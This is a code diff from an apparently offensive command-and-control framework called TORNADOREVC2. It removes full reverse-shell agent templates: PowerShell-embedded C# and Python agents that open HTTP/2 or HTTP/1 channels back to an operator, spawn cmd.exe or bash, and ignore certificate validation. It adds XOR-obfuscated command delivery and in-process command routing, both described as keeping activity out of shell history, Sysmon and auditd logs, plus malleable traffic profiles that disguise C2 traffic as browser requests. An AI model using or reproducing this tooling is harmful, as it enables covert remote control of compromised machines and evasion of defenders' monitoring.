@@ -2,6 +2,7 @@ import argparse
 import base64
 import datetime
 import hashlib
+import json
 import os
 import re
 import random
@@ -20,6 +21,12 @@ from .win_client import (
     probe_windows_platform,
     send_powershell_script,
     text_suggests_windows,
+)
+
+from .http2_transport import (
+    HTTP2_AGENT_TEMPLATE as _HTTP2_AGENT_TEMPLATE,
+    HTTP2_AGENT_LINUX_PY as _HTTP2_AGENT_LINUX_PY,
+    HTTP1_AGENT_PS as _HTTP1_AGENT_PS,
 )
 
 try:
@@ -59,620 +66,369 @@ from .tunnel import TunnelManager
 from .updater import Updater
 from .plugins import PluginManager
 from .http2_transport import Http2Listener
+try:
+    from .smb_transport import SmbPipeSessionSocket
+    _SMB_AVAILABLE = True
+    _SMB_IMPORT_ERROR = None
+except ImportError as _e:
+    SmbPipeSessionSocket = None
+    _SMB_AVAILABLE = False
+    _SMB_IMPORT_ERROR = str(_e)
 import secrets
 
-_HTTP2_AGENT_TEMPLATE = r'''
-$ErrorActionPreference = 'SilentlyContinue'
-$Url = '__H2_URL__'
+# ---------------------------------------------------------------------------
+# Command obfuscation
+#
+# Per-session XOR key. Every command sent to a shell that supports an
+# in-session decoder is wrapped as `_r '<base64(xor(cmd))>'`. The `_r`
+# function is installed once per session; after that the plaintext
+# command never appears on target telemetry (bash history, ps, Sysmon
+# EventID 1, auditd execve).
+#
+# Supported: bash, zsh, PowerShell. Skipped on cmd.exe — cmd has no
+# in-process decoder primitive, and shimming each command through an
+# extra PowerShell process would be a net OPSEC loss.
+# ---------------------------------------------------------------------------
 
-$__agent_code = @'
-$ErrorActionPreference = 'Stop'
-Add-Type -TypeDefinition @"
-using System;
-using System.IO;
-using System.Net;
-using System.Net.Http;
-using System.Threading.Tasks;
+class _CommandObfuscator:
+    def __init__(self, key_bytes):
+        self.key = key_bytes
+        self.hex = key_bytes.hex()
 
-public static class H2Pipe {
-    public class BlockingStream : Stream {
-        private readonly System.Collections.Concurrent.BlockingCollection<byte[]> _q
-            = new System.Collections.Concurrent.BlockingCollection<byte[]>();
-        private byte[] _cur; private int _pos;
-        public override bool CanRead => true;
-        public override bool CanSeek => false;
-        public override bool CanWrite => true;
-        public override long Length => throw new NotSupportedException();
-        public override long Position { get => 0; set => throw new NotSupportedException(); }
-        public override void Flush() { }
-        public override long Seek(long o, SeekOrigin s) => throw new NotSupportedException();
-        public override void SetLength(long v) => throw new NotSupportedException();
-        public override int Read(byte[] buf, int off, int len) {
-            if (_cur == null || _pos >= _cur.Length) { _cur = _q.Take(); _pos = 0; }
-            int n = Math.Min(len, _cur.Length - _pos);
-            Array.Copy(_cur, _pos, buf, off, n);
-            _pos += n;
-            return n;
-        }
-        public override void Write(byte[] buf, int off, int len) {
-            byte[] c = new byte[len];
-            Array.Copy(buf, off, c, 0, len);
-            _q.Add(c);
-        }
-    }
-
-    public static async Task Run(string url) {
-        var handler = new HttpClientHandler {
-            ServerCertificateCustomValidationCallback = (m, c, ch, e) => true,
-        };
-        using var client = new HttpClient(handler) {
-            DefaultRequestVersion = HttpVersion.Version20,
-            DefaultVersionPolicy  = HttpVersionPolicy.RequestVersionExact,
-            Timeout = System.Threading.Timeout.InfiniteTimeSpan,
-        };
-        client.DefaultRequestHeaders.Add("User-Agent",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
-            "(KHTML, like Gecko) Chrome/120.0 Safari/537.36");
-
-        var up = new BlockingStream();
-        var content = new StreamContent(up);
-        var request = new HttpRequestMessage(HttpMethod.Post, url) { Content = content };
-        var response = await client.SendAsync(
-            request, HttpCompletionOption.ResponseHeadersRead);
-        response.EnsureSuccessStatusCode();
-        var down = await response.Content.ReadAsStreamAsync();
-
-        var psi = new System.Diagnostics.ProcessStartInfo {
-            FileName = "cmd.exe",
-            UseShellExecute = false,
-            RedirectStandardInput  = true,
-            RedirectStandardOutput = true,
-            RedirectStandardError  = true,
-            CreateNoWindow = true,
-        };
-        var proc = System.Diagnostics.Process.Start(psi);
-
-        var t1 = Task.Run(async () => {
-            var buf = new byte[4096]; int n;
-            while ((n = await down.ReadAsync(buf, 0, buf.Length)) > 0) {
-                await proc.StandardInput.BaseStream.WriteAsync(buf, 0, n);
-                await proc.StandardInput.BaseStream.FlushAsync();
-            }
-        });
-        var t2 = Task.Run(async () => {
-            var buf = new byte[4096]; int n;
-            while ((n = await proc.StandardOutput.BaseStream.ReadAsync(buf, 0, buf.Length)) > 0)
-                up.Write(buf, 0, n);
-        });
-        var t3 = Task.Run(async () => {
-            var buf = new byte[4096]; int n;
-            while ((n = await proc.StandardError.BaseStream.ReadAsync(buf, 0, buf.Length)) > 0)
-                up.Write(buf, 0, n);
-        });
-        await Task.WhenAll(t1, t2, t3);
-    }
-}
-"@ -Language CSharp
-
-[H2Pipe]::Run('__H2_URL__').GetAwaiter().GetResult()
-'@
-
-# Launch the agent as a detached background job so the shell
-# returns to its prompt immediately.
-$__job = Start-Job -ScriptBlock ([ScriptBlock]::Create($__agent_code)) `
-    -ErrorAction SilentlyContinue
-
-if ($__job) {
-    Write-Output ('H2_LAUNCHED:' + $__job.Id)
-} else {
-    Write-Output 'H2_LAUNCH_FAILED'
-}
-'''
-
-_HTTP2_AGENT_LINUX_PY = r'''
-import os, queue, signal, socket, ssl, subprocess, sys, threading, time
-
-HOST = "__H2_HOST__"
-PORT = __H2_PORT__
-PATH = "__H2_PATH__"
-
-try:
-    signal.signal(signal.SIGPIPE, signal.SIG_IGN)
-except Exception:
-    pass
-
-MODE = "h2"
-try:
-    import h2.config, h2.connection, h2.events
-except ImportError:
-    try:
-        subprocess.run(
-            [sys.executable, "-m", "pip", "install", "--quiet", "--user", "h2"],
-            check=False, timeout=60,
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-        )
-        import h2.config, h2.connection, h2.events
-    except Exception:
-        MODE = "h1"
+    def encode(self, cmd: str) -> str:
+        raw = cmd.encode('utf-8')
+        k = self.key
+        n = len(k)
+        xored = bytes(b ^ k[i % n] for i, b in enumerate(raw))
+        return base64.b64encode(xored).decode('ascii')
 
 
-def _spawn_shell():
-    return subprocess.Popen(
-        ["/bin/bash", "--noprofile", "--norc"],
-        stdin=subprocess.PIPE, stdout=subprocess.PIPE,
-        stderr=subprocess.STDOUT, bufsize=0,
-        start_new_session=True,
+def _unix_obfuscator_installer(hex_key: str) -> str:
+    """
+    Single-line bash function definition.
+
+    The decoded command is executed with `eval` in the CALLER's shell,
+    not piped into a `bash` subprocess. This matters for stateful
+    sequences: the HTTP/2 agent delivery in _deliver_http2_linux
+    accumulates a base64 blob into a shell variable across many _r
+    invocations, and the variable must survive between calls. A
+    piped-to-bash subshell would lose every assignment.
+    """
+    return (
+        "_r() { "
+        "if command -v python3 >/dev/null 2>&1; then "
+        "eval \"$(python3 -c 'import sys,base64;"
+        "k=bytes.fromhex(sys.argv[1]);"
+        "d=base64.b64decode(sys.argv[2]);"
+        "sys.stdout.write(bytes(c^k[i%len(k)] "
+        "for i,c in enumerate(d)).decode(\"utf-8\",\"replace\"))' "
+        f"{hex_key} \"$1\" 2>/dev/null)\"; "
+        "else "
+        "eval \"$(printf '%s' \"$1\" | base64 -d 2>/dev/null)\"; "
+        "fi; "
+        "}"
     )
 
 
-def _shutdown_socket(sock):
-    try:
-        sock.shutdown(socket.SHUT_RDWR)
-    except Exception:
-        pass
-    try:
-        sock.close()
-    except Exception:
-        pass
+def _powershell_obfuscator_installer(hex_key: str) -> str:
+    """
+    PowerShell function definition. Decodes base64, XORs with the
+    session key, hands the result to [ScriptBlock]::Create (never IEX).
+    """
+    klen = len(hex_key) // 2
+    return (
+        "function _r($s) { "
+        f"$h='{hex_key}'; $n={klen}; "
+        "$k=[byte[]]::new($n); "
+        "for($i=0;$i -lt $n;$i++){"
+        "$k[$i]=[Convert]::ToByte($h.Substring($i*2,2),16)}; "
+        "$b=[Convert]::FromBase64String($s); "
+        "$o=[byte[]]::new($b.Length); "
+        "for($i=0;$i -lt $b.Length;$i++){"
+        "$o[$i]=$b[$i] -bxor $k[$i % $n]}; "
+        "& ([ScriptBlock]::Create([Text.Encoding]::UTF8.GetString($o))) "
+        "}"
+    )
 
 
-# ------------------------------------------------------------------ h2 path
+# ---------------------------------------------------------------------------
+# Session
+#
+# One logical reverse/bind shell session. Subclasses dict so all existing
+# `session['id']` / `.get('key')` / iteration access keeps working during
+# and after migration. State transitions go through explicit methods so
+# the class is the single source of truth for what a session can be.
+#
+# Thread-safety: mutations go through the owning handler's `client_lock`,
+# not a lock on the session itself. Methods are intentionally lock-free so
+# they can be composed inside a single critical section.
+# ---------------------------------------------------------------------------
 
-def run_h2():
-    cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
-    conn = h2.connection.H2Connection(config=cfg)
+class Session(dict):
+    def __init__(self, sock, addr, direction='reverse'):
+        super().__init__()
+        self.update({
+            'sock': sock,
+            'addr': addr,
+            'direction': direction,
+            'type': 'unknown',
+            'id': None,
+            'name': None,
+            'tls': isinstance(sock, ssl.SSLSocket),
+            'mtls': False,
+            'pty': False,
+            'init': False,
+            'sysinfo': None,
+            'identity': None,
+            'logger': None,
+            'fingerprint': None,
+            'connect_count': 1,
+            'reconnected': False,
+            'transports': {'shell': sock, 'http2': None, 'smb': None},
+            'active_transport': 'shell',
+            'h2_token': None,
+            'obfuscator': None,
+            'probe_markers': None,
+            'win_shell': None,
+            '_win_probe_done': False,
+            'lateral_via': None,
+            '_last_h2_close_reason': None,
+            '_h2_launch_marker': None,
+            '_smb_killed': False,
+            '_lateral_a_sock': None,
+            '_lateral_stopped': False,
+        })
 
-    raw = socket.create_connection((HOST, PORT), timeout=30)
-    ctx = ssl.create_default_context()
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE
-    try:
-        ctx.set_alpn_protocols(["h2"])
-    except Exception:
-        pass
-    sock = ctx.wrap_socket(raw, server_hostname=HOST)
+    # -- convenience ---------------------------------------------------
 
-    try:
-        sock.settimeout(None)
-    except Exception:
-        pass
-    try:
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-    except Exception:
-        pass
+    @property
+    def sid(self):
+        return self.get('id')
 
-    conn.initiate_connection()
-    sock.sendall(conn.data_to_send())
+    @property
+    def is_identified(self):
+        return self.get('id') is not None
 
-    sid = conn.get_next_available_stream_id()
-    conn.send_headers(sid, [
-        (":method", "POST"), (":path", PATH),
-        (":authority", HOST + ":" + str(PORT)), (":scheme", "https"),
-        ("content-type", "application/octet-stream"),
-        ("user-agent", "Mozilla/5.0 (X11; Linux x86_64)"),
-    ], end_stream=False)
-    sock.sendall(conn.data_to_send())
+    @property
+    def is_windows(self):
+        return (self.get('type') or '').lower() == 'windows'
 
-    stop_evt      = threading.Event()
-    h2_lock       = threading.Lock()
-    pending_out   = []
-    window_updated = threading.Event()
+    @property
+    def shell_sock(self):
+        return (self.get('transports') or {}).get('shell')
 
-    # ---- shell lifecycle: reader + writer threads share this state ------
-    shell_state      = {'proc': None}
-    shell_spawn_lock = threading.Lock()
-    stdin_q          = queue.Queue(maxsize=8192)
+    # -- state transitions ---------------------------------------------
 
-    def _spawn_shell_locked():
-        proc = _spawn_shell()
-        shell_state['proc'] = proc
-        threading.Thread(
-            target=shell_reader, args=(proc,), daemon=True,
-        ).start()
-        return proc
+    def identify(self, sid, session_type, fingerprint, logger=None):
+        """Move from unidentified to identified. After this the session
+        is safe to appear in `status` listings."""
+        self['id'] = int(sid)
+        self['type'] = session_type
+        self['fingerprint'] = fingerprint
+        if logger is not None:
+            self['logger'] = logger
+        return self
 
-    def _ensure_shell():
-        with shell_spawn_lock:
-            proc = shell_state['proc']
-            if proc is None or proc.poll() is not None:
-                rc = None if proc is None else proc.poll()
-                _spawn_shell_locked()
-            return shell_state['proc']
+    def attach_transport(self, key, sock):
+        """Attach a secondary transport. Idempotent if the same socket
+        is re-attached; raises if a different socket is already present
+        under the same key."""
+        tr = self.setdefault(
+            'transports', {'shell': None, 'http2': None, 'smb': None},
+        )
+        existing = tr.get(key)
+        if existing is not None and existing is not sock:
+            raise ValueError(f'transport {key!r} already attached')
+        tr[key] = sock
+        return self
 
-    def shell_writer():
-        """Drain stdin_q into the current shell. This is the ONLY place
-        that ever writes to shell stdin. If the write fails, respawn."""
-        while not stop_evt.is_set():
-            try:
-                data = stdin_q.get(timeout=0.5)
-            except queue.Empty:
-                continue
-            if data is None:
-                return
-            while not stop_evt.is_set():
-                proc = _ensure_shell()
-                try:
-                    proc.stdin.write(data)
-                    proc.stdin.flush()
-                    break
-                except Exception as e:
-                    with shell_spawn_lock:
-                        if shell_state['proc'] is proc:
-                            try:
-                                proc.terminate()
-                            except Exception:
-                                pass
-                            shell_state['proc'] = None
-                    time.sleep(0.2)
-
-    def _drain_out():
-        while pending_out and not stop_evt.is_set():
-            try:
-                window = conn.local_flow_control_window(sid)
-            except Exception as e:
-                stop_evt.set()
-                return
-            if window <= 0:
-                return
-            head    = pending_out[0]
-            to_send = min(len(head), window, conn.max_outbound_frame_size)
-            try:
-                conn.send_data(sid, head[:to_send], end_stream=False)
-                sock.sendall(conn.data_to_send())
-            except Exception as e:
-                stop_evt.set()
-                return
-            if to_send >= len(head):
-                pending_out.pop(0)
-            else:
-                pending_out[0] = head[to_send:]
-
-    def shell_reader(proc):
-        """Read from ONE shell's stdout. Returns on EOF; the writer will
-        respawn (and start a new reader) when the next command arrives."""
+    def activate(self, key):
+        """Mark `key` as the active transport. Refuses if the transport
+        is missing or its fileno is invalid — this is the guard that
+        prevents a dead transport from showing as active."""
+        tr = self.get('transports') or {}
+        sock = tr.get(key)
+        if sock is None:
+            raise ValueError(f'cannot activate missing transport {key!r}')
         try:
-            while not stop_evt.is_set():
-                try:
-                    data = os.read(proc.stdout.fileno(), 4096)
-                except Exception as e:
-                    return
-                if not data:
-                    return
-                with h2_lock:
-                    pending_out.append(data)
-                    _drain_out()
-                    has_more = bool(pending_out)
-                while has_more and not stop_evt.is_set():
-                    window_updated.wait(timeout=1.0)
-                    window_updated.clear()
-                    with h2_lock:
-                        _drain_out()
-                        has_more = bool(pending_out)
+            if sock.fileno() == -1:
+                raise ValueError(f'transport {key!r} is closed')
+        except ValueError:
+            raise
         except Exception as e:
+            raise ValueError(f'transport {key!r} not usable: {e}')
+        self['active_transport'] = key
+        return self
 
-    # Bootstrap the first shell + writer thread.
-    with shell_spawn_lock:
-        _spawn_shell_locked()
-    threading.Thread(target=shell_writer, daemon=True).start()
+    def detach_transport(self, key):
+        """Detach a secondary transport. If it was active, fall back to
+        the next live transport in preference order. Returns the new
+        active key (or None if nothing is live)."""
+        tr = self.get('transports') or {}
+        tr[key] = None
+        self['transports'] = tr
 
-    try:
-        while not stop_evt.is_set():
+        if self.get('active_transport') != key:
+            return self['active_transport']
+
+        for candidate in ('shell', 'http2', 'smb'):
+            s = tr.get(candidate)
+            if s is None:
+                continue
             try:
-                data = sock.recv(65536)
-            except Exception as e:
-                break
-            if not data:
-                break
-
-            with h2_lock:
-                try:
-                    events = conn.receive_data(data)
-                except Exception as e:
-                    break
-                got_window_update = False
-                for ev in events:
-                    if isinstance(ev, h2.events.DataReceived):
-                        # NEVER touch shell.stdin from this thread.
-                        try:
-                            stdin_q.put_nowait(ev.data)
-                        except queue.Full:
-                                 % len(ev.data))
-                        try:
-                            conn.acknowledge_received_data(
-                                ev.flow_controlled_length, ev.stream_id)
-                        except Exception:
-                            pass
-                    elif isinstance(ev, h2.events.WindowUpdated):
-                        if ev.stream_id in (0, sid):
-                            got_window_update = True
-                    elif isinstance(ev, (h2.events.StreamEnded,
-                                         h2.events.StreamReset)):
-                             % type(ev).__name__)
-                        stop_evt.set()
-                        break
-                    elif isinstance(ev, h2.events.ConnectionTerminated):
-                        stop_evt.set()
-                        break
-
-                try:
-                    out = conn.data_to_send()
-                    if out:
-                        sock.sendall(out)
-                except Exception:
-                    stop_evt.set()
-                    break
-
-                if got_window_update:
-                    _drain_out()
-
-            if got_window_update:
-                window_updated.set()
-    finally:
-        stop_evt.set()
-        window_updated.set()
-        try:
-            stdin_q.put_nowait(None)
-        except Exception:
-            pass
-        with shell_spawn_lock:
-            proc = shell_state['proc']
-        if proc is not None:
-            try:
-                proc.terminate()
+                if s.fileno() != -1:
+                    self['active_transport'] = candidate
+                    return candidate
             except Exception:
-                pass
-        try:
-            with h2_lock:
-                conn.end_stream(sid)
-                sock.sendall(conn.data_to_send())
-        except Exception:
-            pass
-        _shutdown_socket(sock)
+                continue
+        self['active_transport'] = None
+        return None
 
-
-# ------------------------------------------------------------------ h1 path
-
-def run_h1():
-    raw = socket.create_connection((HOST, PORT), timeout=30)
-    ctx = ssl.create_default_context()
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE
-    try:
-        ctx.set_alpn_protocols(["http/1.1"])
-    except Exception:
-        pass
-    sock = ctx.wrap_socket(raw, server_hostname=HOST)
-    try:
-        sock.settimeout(None)
-    except Exception:
-        pass
-    try:
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-    except Exception:
-        pass
-
-    sock.sendall((
-        f"POST {PATH} HTTP/1.1\r\n"
-        f"Host: {HOST}:{PORT}\r\n"
-        f"Content-Type: application/octet-stream\r\n"
-        f"Transfer-Encoding: chunked\r\n"
-        f"Connection: keep-alive\r\n\r\n"
-    ).encode())
-
-    buf = b""
-    while b"\r\n\r\n" not in buf:
-        d = sock.recv(4096)
-        if not d:
-            return
-        buf += d
-    head_end = buf.find(b"\r\n\r\n")
-    rest = buf[head_end + 4:]
-
-    shell = _spawn_shell()
-    send_lock = threading.Lock()
-    stop_evt = threading.Event()
-
-    def shell_reader(shell_ref):
-        try:
-            while not stop_evt.is_set():
-                try:
-                    data = os.read(shell_ref.stdout.fileno(), 4096)
-                except Exception:
-                    data = b""
-                if not data:
-                    return
-                with send_lock:
-                    try:
-                        chunk = f"{len(data):x}\r\n".encode() + data + b"\r\n"
-                        sock.sendall(chunk)
-                    except Exception:
-                        stop_evt.set()
-                        _shutdown_socket(sock)
-                        return
-        except Exception:
-            return
-
-    threading.Thread(target=shell_reader, args=(shell,), daemon=True).start()
-
-    rbuf = bytearray(rest)
-
-    def _recv_more():
-        try:
-            d = sock.recv(65536)
-        except Exception:
-            return False
-        if not d:
-            return False
-        rbuf.extend(d)
-        return True
-
-    try:
-        while not stop_evt.is_set():
-            nl = rbuf.find(b"\r\n")
-            while nl < 0:
-                if not _recv_more():
-                    stop_evt.set()
-                    return
-                nl = rbuf.find(b"\r\n")
-            size_hex = bytes(rbuf[:nl]).split(b";")[0].strip()
-            del rbuf[:nl + 2]
+    def active_sock(self):
+        """Return the current live transport socket in preference order,
+        or None if nothing is alive."""
+        tr = self.get('transports') or {}
+        preferred = self.get('active_transport')
+        candidates = []
+        if preferred:
+            candidates.append(tr.get(preferred))
+        for k in ('shell', 'http2', 'smb'):
+            s = tr.get(k)
+            if s is not None and s not in candidates:
+                candidates.append(s)
+        for s in candidates:
+            if s is None:
+                continue
             try:
-                size = int(size_hex, 16)
-            except ValueError:
-                stop_evt.set()
-                return
-            if size == 0:
-                stop_evt.set()
-                return
-            while len(rbuf) < size + 2:
-                if not _recv_more():
-                    stop_evt.set()
-                    return
-            payload = bytes(rbuf[:size])
-            del rbuf[:size + 2]
-            try:
-                shell.stdin.write(payload)
-                shell.stdin.flush()
+                if s.fileno() != -1:
+                    return s
             except Exception:
-                try:
-                    shell.terminate()
-                except Exception:
-                    pass
-                shell = _spawn_shell()
-                threading.Thread(
-                    target=shell_reader,
-                    args=(shell,), daemon=True,
-                ).start()
-    finally:
-        stop_evt.set()
-        try:
-            shell.terminate()
-        except Exception:
-            pass
-        _shutdown_socket(sock)
+                continue
+        return None
+
+    def is_secondary(self, sock):
+        """True if `sock` is a secondary transport for this session."""
+        tr = self.get('transports') or {}
+        return (tr.get('http2') is sock) or (tr.get('smb') is sock)
+
+    def mark_reconnect(self, connect_count):
+        self['reconnected'] = True
+        self['connect_count'] = connect_count
+        return self
+
+# ---------------------------------------------------------------------------
+# Malleable profile
+#
+# A JSON file that parameterises the agent's HTTP fingerprint: URI
+# pattern, User-Agent, and extra headers. The handler reads it at
+# startup and substitutes into the target-side agent templates.
+#
+# Fields can be omitted; missing keys fall back to the defaults below.
+# ---------------------------------------------------------------------------
+
+_DEFAULT_PROFILE = {
+    'http2': {
+        'user_agent': (
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+            "AppleWebKit/537.36 (KHTML, like Gecko) "
+            "Chrome/120.0.0.0 Safari/537.36"
+        ),
+        'linux_user_agent': (
+            "Mozilla/5.0 (X11; Linux x86_64) "
+            "AppleWebKit/537.36 (KHTML, like Gecko) "
+            "Chrome/120.0.0.0 Safari/537.36"
+        ),
+        'uri_pattern': '/c2/{token}?s={proof}',
+        'extra_headers': {},
+    },
+    'http1': {
+        'user_agent': (
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+            "AppleWebKit/537.36 (KHTML, like Gecko) "
+            "Chrome/120.0.0.0 Safari/537.36"
+        ),
+        'uri_pattern': '/c2/{token}?s={proof}',
+    },
+}
 
 
-if __name__ == "__main__":
+def _load_malleable_profile(path):
+    """Load and merge a JSON profile with the defaults. Never raises."""
+    import copy
+    merged = copy.deepcopy(_DEFAULT_PROFILE)
+    if not path:
+        return merged
+    if not os.path.exists(path):
+        print(f"[profile] {path} not found — using built-in defaults")
+        return merged
     try:
-        if MODE == "h2":
-            run_h2()
-        else:
-            run_h1()
-    except Exception:
-        try:
-            if MODE == "h2":
-                run_h1()
-        except Exception:
-            pass
-'''
+        with open(path, 'r', encoding='utf-8') as f:
+            user = json.load(f)
+    except Exception as exc:
+        print(f"[profile] failed to load {path}: {exc} — using defaults")
+        return merged
+    for section in ('http2', 'http1'):
+        if isinstance(user.get(section), dict):
+            for k, v in user[section].items():
+                merged[section][k] = v
+    print(f"[profile] loaded {path}")
+    return merged
 
-_HTTP1_AGENT_PS = r'''
-$ErrorActionPreference = 'SilentlyContinue'
-$Url = '__H1_URL__'
 
-$__agent_code = @'
-$ErrorActionPreference = 'Stop'
+def _scan_profiles(directory):
+    """Return sorted list of profile name stems from a directory."""
+    if not directory or not os.path.isdir(directory):
+        return []
+    try:
+        return sorted(
+            entry[:-5] for entry in os.listdir(directory)
+            if entry.endswith('.json') and not entry.startswith('.')
+        )
+    except OSError:
+        return []
 
-try {
-  [System.Net.ServicePointManager]::SecurityProtocol = `
-    [System.Net.SecurityProtocolType]::Tls12
-} catch {}
-try {
-  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = `
-    { param($s,$c,$ch,$e) $true }
-} catch {}
 
-Add-Type -TypeDefinition @"
-using System;
-using System.IO;
-using System.Net;
-using System.Threading;
-using System.Threading.Tasks;
+# ---------------------------------------------------------------------------
+# ECDSA command signing
+#
+# A per-run ECDSA P-256 keypair. Every command delivered to an agent that
+# supports verification is signed with the private key; the agent holds
+# only the public key (embedded at build time). An attacker who captures
+# the transport but not the handler process cannot forge a command.
+#
+# Coverage:
+#   - Windows HTTP/2 agent  — via .NET ECDsa (implemented)
+#   - Primary shell channel — not covered (no crypto primitive in bash/cmd)
+#   - Linux HTTP/2 agent    — not implemented
+#   - SMB C# pipe server    — not implemented
+# ---------------------------------------------------------------------------
 
-public static class Http1Shell {
-    public static void Run(string url) {
-        var req = (HttpWebRequest)WebRequest.Create(url);
-        req.Method = "POST";
-        req.ContentType = "application/octet-stream";
-        req.SendChunked = true;
-        req.AllowWriteStreamBuffering = false;
-        req.Timeout = Timeout.Infinite;
-        req.ReadWriteTimeout = Timeout.Infinite;
-        req.Proxy = null;
-        req.KeepAlive = true;
+try:
+    from cryptography.hazmat.primitives.asymmetric import ec as _ec
+    from cryptography.hazmat.primitives import hashes as _hashes
+    from cryptography.hazmat.primitives import serialization as _ser
+    _ECDSA_AVAILABLE = True
+except ImportError:
+    _ECDSA_AVAILABLE = False
 
-        Stream reqStream = req.GetRequestStream();
-        IAsyncResult asyncResp = req.BeginGetResponse(null, null);
 
-        var psi = new System.Diagnostics.ProcessStartInfo {
-            FileName = "cmd.exe",
-            UseShellExecute = false,
-            RedirectStandardInput  = true,
-            RedirectStandardOutput = true,
-            RedirectStandardError  = true,
-            CreateNoWindow = true,
-        };
-        var proc = System.Diagnostics.Process.Start(psi);
+class _CommandSigner:
+    def __init__(self):
+        if not _ECDSA_AVAILABLE:
+            raise RuntimeError('cryptography not installed')
+        self.private = _ec.generate_private_key(_ec.SECP256R1())
+        self.public_pem = self.private.public_key().public_bytes(
+            encoding=_ser.Encoding.PEM,
+            format=_ser.PublicFormat.SubjectPublicKeyInfo,
+        ).decode('ascii')
 
-        object writeLock = new object();
+    def sign(self, payload: bytes) -> bytes:
+        return self.private.sign(payload, _ec.ECDSA(_hashes.SHA256()))
 
-        var tA = Task.Run(() => {
-            try {
-                while (!asyncResp.IsCompleted) Thread.Sleep(20);
-                var resp = (HttpWebResponse)req.EndGetResponse(asyncResp);
-                Stream rs = resp.GetResponseStream();
-                byte[] buf = new byte[4096];
-                int n;
-                while ((n = rs.Read(buf, 0, buf.Length)) > 0) {
-                    proc.StandardInput.BaseStream.Write(buf, 0, n);
-                    proc.StandardInput.BaseStream.Flush();
-                }
-            } catch {}
-        });
-
-        var tB = Task.Run(() => {
-            try {
-                byte[] buf = new byte[4096];
-                int n;
-                while ((n = proc.StandardOutput.BaseStream.Read(buf, 0, buf.Length)) > 0) {
-                    lock (writeLock) {
-                        reqStream.Write(buf, 0, n);
-                        reqStream.Flush();
-                    }
-                }
-            } catch {}
-        });
-
-        var tC = Task.Run(() => {
-            try {
-                byte[] buf = new byte[4096];
-                int n;
-                while ((n = proc.StandardError.BaseStream.Read(buf, 0, buf.Length)) > 0) {
-                    lock (writeLock) {
-                        reqStream.Write(buf, 0, n);
-                        reqStream.Flush();
-                    }
-                }
-            } catch {}
-        });
-
-        Task.WaitAll(tA, tB, tC);
-    }
-}
-"@ -Language CSharp
-
-[Http1Shell]::Run('__H1_URL__')
-'@
-
-$__job = Start-Job -ScriptBlock ([ScriptBlock]::Create($__agent_code)) `
-    -ErrorAction SilentlyContinue
-
-if ($__job) {
-    Write-Output ('H2_LAUNCHED:' + $__job.Id)
-} else {
-    Write-Output 'H2_LAUNCH_FAILED'
-}
-'''
+    def signed_envelope(self, payload: bytes) -> bytes:
+        """Return b'<b64sig>:<b64payload>' — a single wire-safe line."""
+        sig = self.sign(payload)
+        return base64.b64encode(sig) + b':' + base64.b64encode(payload)
 
 def _detect_mtls(client_sock):
     if not isinstance(client_sock, ssl.SSLSocket):
@@ -681,6 +437,65 @@ def _detect_mtls(client_sock):
         return bool(client_sock.getpeercert())
     except Exception:
         return False
+
+
+# ---------------------------------------------------------------------------
+# In-process routing
+#
+# A single dispatcher that maps common shell commands onto the Linux
+# agent's in-process verbs. Plugins that emit `cat`, `ls`, `env`, or
+# `ps` get routed through the agent's native code — no `subprocess`
+# on the target, no Sysmon EventID 1, no auditd execve.
+#
+# Anything that doesn't match falls through to the shell exactly as
+# before. Plugins don't need to change: the routing is entirely
+# inside the handler.
+# ---------------------------------------------------------------------------
+
+_INPROC_PATTERNS = [
+    # cat [flags] <path>
+    (re.compile(r'^cat\s+(?:-[a-zA-Z]+\s+)*(?P<path>[^\s|;><&"\']+)\s*$'), '__rd'),
+    # ls [flags] [path]
+    (re.compile(r'^ls(?:\s+-[a-zA-Z]+)*\s*(?P<path>[^\s|;><&"\']*)\s*$'), '__ls'),
+    # env / printenv [name]
+    (re.compile(r'^(?:env|printenv)(?:\s+(?P<name>[A-Za-z_][A-Za-z0-9_]*))?\s*$'), '__env'),
+    # ps auxww / ps -ef / ps aux / ps -e -f / BSD variants with dashes
+    (re.compile(r'^ps\s+(?:-?auxww|-?aux|-?ax|-e\s+-f|-ef|-e|-f)\s*$'), '__ps'),
+    # pwd / /bin/pwd
+    (re.compile(r'^(?:/bin/)?pwd\s*$'), '__pwd'),
+    # whoami / id -un
+    (re.compile(r'^(?:whoami|id\s+-un)\s*$'), '__whoami'),
+    # id [flags]
+    (re.compile(r'^id(?:\s+-[a-zA-Z]+)?\s*$'), '__id'),
+    # hostname [-f|-s]
+    (re.compile(r'^hostname(?:\s+-[fs])?\s*$'), '__hostname'),
+    # uname [flags]
+    (re.compile(r'^uname(?:\s+-[a-z]+)?\s*$'), '__uname'),
+]
+
+
+def _match_inproc(cmd, info, client_sock):
+    """
+    Return (verb, arg) if the command can be served in-process, else None.
+
+    Only routes commands targeted at an HTTP/2 bridge to a Linux/Unix
+    session. The primary shell channel and Windows sessions always
+    fall through.
+    """
+    if info is None:
+        return None
+    if (info.get('type') or '').lower() != 'unix':
+        return None
+    if (info.get('transports') or {}).get('http2') is not client_sock:
+        return None
+    stripped = cmd.strip()
+    for pattern, verb in _INPROC_PATTERNS:
+        m = pattern.match(stripped)
+        if m:
+            arg = m.groupdict().get('path') or m.groupdict().get('name') or ''
+            return verb, arg
+    return None
+
 
 class TORNADOREVC2:
     def __init__(self, host='0.0.0.0', revshell_port=4444, tls_port=8443, mtls_port=9443,
@@ -732,6 +547,28 @@ class TORNADOREVC2:
             'red': '\033[91m', 'bold': '\033[1m', 'end': '\033[0m', 'blue': '\033[94m',
         }
         self.payloads = self._build_payloads()
+        self._h2_hmac_secret = secrets.token_bytes(32)
+        self._launch_marker = "L" + secrets.token_hex(6)
+        self._front_domain = None
+        self._front_port   = 443
+        self._smb_pending = {}
+        # Malleable profile — populated by main() before start().
+        # Defaults are used when no --profile flag is passed.
+        self.profile = _load_malleable_profile(None)
+        # Directory scanned by `http2switch` and the `profiles` command.
+        self.profile_dir = os.path.join(
+            os.path.dirname(os.path.abspath(__file__)), 'profiles',
